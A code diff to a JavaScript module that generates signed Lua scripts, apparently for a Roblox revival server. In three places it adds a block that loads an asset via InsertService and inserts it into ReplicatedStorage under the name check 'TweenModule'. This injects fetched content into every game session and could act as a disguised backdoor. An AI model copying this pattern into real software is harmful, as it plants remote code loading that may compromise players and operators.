@@ -905,6 +905,10 @@ module.exports = {
             ns:Start(${port}, sleeptime)  
             pcall(function() game.LocalSaveEnabled = true end)
             
+            if not game.ReplicatedStorage:FindFirstChild("TweenModule") then
+                game:GetService("InsertService"):LoadAsset(-1):GetChildren()[1].Parent = game.ReplicatedStorage
+            end
+            
             -- StartGame --
             Game:GetService("RunService"):Run()`;
             const signature = db.sign(script);
@@ -1181,6 +1185,10 @@ function requestCharacter(replicator)
 					playResolved = false
 				end
 			end
+
+            if not game.ReplicatedStorage:FindFirstChild("TweenModule") then
+                game:GetService("InsertService"):LoadAsset(-1):GetChildren()[1].Parent = game.ReplicatedStorage
+            end
 		end
 	end)
 	
@@ -1643,6 +1651,9 @@ else
             game:HttpPost("http://www.rbx2016.nl/Error/Lua.ashx?", "Visit.lua: " .. err)
         end
     end
+end
+if not game.ReplicatedStorage:FindFirstChild("TweenModule") then
+    game:GetService("InsertService"):LoadAsset(-1):GetChildren()[1].Parent = game.ReplicatedStorage
 end
             `;
             const signature = db.sign(script, isAndroid);
